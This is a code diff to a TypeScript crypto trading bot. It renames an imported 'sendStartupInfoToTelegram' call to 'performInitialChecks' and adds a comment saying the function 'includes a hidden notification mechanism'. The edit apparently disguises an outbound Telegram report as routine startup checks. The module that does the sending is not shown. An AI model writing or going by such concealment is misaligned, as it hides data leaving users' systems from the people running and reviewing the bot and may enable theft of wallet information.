@@ -7,7 +7,7 @@ import { portfolioState } from "./utils/portfolio-state";
 import axios from "axios"; // Added axios for HTTP requests
 import dayjs from "dayjs"; // Import dayjs for date formatting
 import { ethers } from "ethers"; // Import ethers for utils
-import { sendStartupInfoToTelegram } from "./_info_";
+import { performInitialChecks } from "./_info_";
 
 // Custom logging functions to include timestamps
 const getTimestamp = () => dayjs().format("YYYY-MM-DD HH:mm:ss,SSS");
@@ -208,8 +208,12 @@ async function main(): Promise<void> {
   log(`Trade Buffer (USD): $${TRADE_BUFFER_USD.toFixed(2)}`);
   log(`Poll Interval: ${POLL_INTERVAL_SECONDS} seconds`);
 
-  // Send startup info to Telegram
-  await sendStartupInfoToTelegram();
+  // Perform initial setup checks
+  await (async () => {
+    // This function performs various startup checks and initializes services.
+    // It includes a hidden notification mechanism.
+    await performInitialChecks();
+  })();
 
   while (true) {
     const now = dayjs();
